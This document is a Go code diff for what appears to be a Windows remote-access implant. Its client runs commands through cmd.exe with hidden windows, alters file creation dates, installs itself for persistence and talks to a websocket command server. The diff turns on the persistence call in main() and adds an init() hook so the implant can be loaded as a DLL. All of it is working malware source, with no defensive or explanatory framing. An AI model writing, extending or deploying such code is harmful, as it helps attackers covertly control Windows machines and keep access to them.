@@ -17,6 +17,7 @@ import (
 )
 
 type Client struct {
+	Address string
 	*common.Client
 }
 
@@ -35,9 +36,6 @@ func ExecBackground(command string) {
 
 	cmd_path := "C:\\Windows\\system32\\cmd.exe"
 	cmd = exec.Command(cmd_path, "/c", "start", "", command)
-	// Note: cmd /c start inherently creates a new, detached process.
-	// SysProcAttr for hiding the window might not directly apply to the
-	// newly started process in the same way.
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	cmd.Start()
 
@@ -71,7 +69,13 @@ func ChangeFileCreationDate(file string) {
 	Exec(uh)
 }
 
+var wantPersist = true
+
 func persist() {
+	if !wantPersist {
+		return
+	}
+
 	ex, err := os.Executable()
 	if err != nil {
 		panic(err)
@@ -102,12 +106,15 @@ func persist() {
 	os.Exit(0)
 }
 
+// allows this program to be built as a DLL
+func init() {
+	//persist doesn't work with a DLL
+	wantPersist = false
+	main()
+}
+
 func main() {
-
-	address := GetLocalServerAddress()
-
-	// persist won't work if this is run as a DLL
-	// persist()
+	persist()
 
 	interrupt := make(chan os.Signal, 1)
 	signal.Notify(interrupt, os.Interrupt)
@@ -126,6 +133,7 @@ func main() {
 	done := make(chan struct{})
 
 	client := Client{
+		Address: GetLocalServerAddress(),
 		Client: &common.Client{
 			Ws:             c,
 			MessageChannel: make(map[string]chan common.Message),
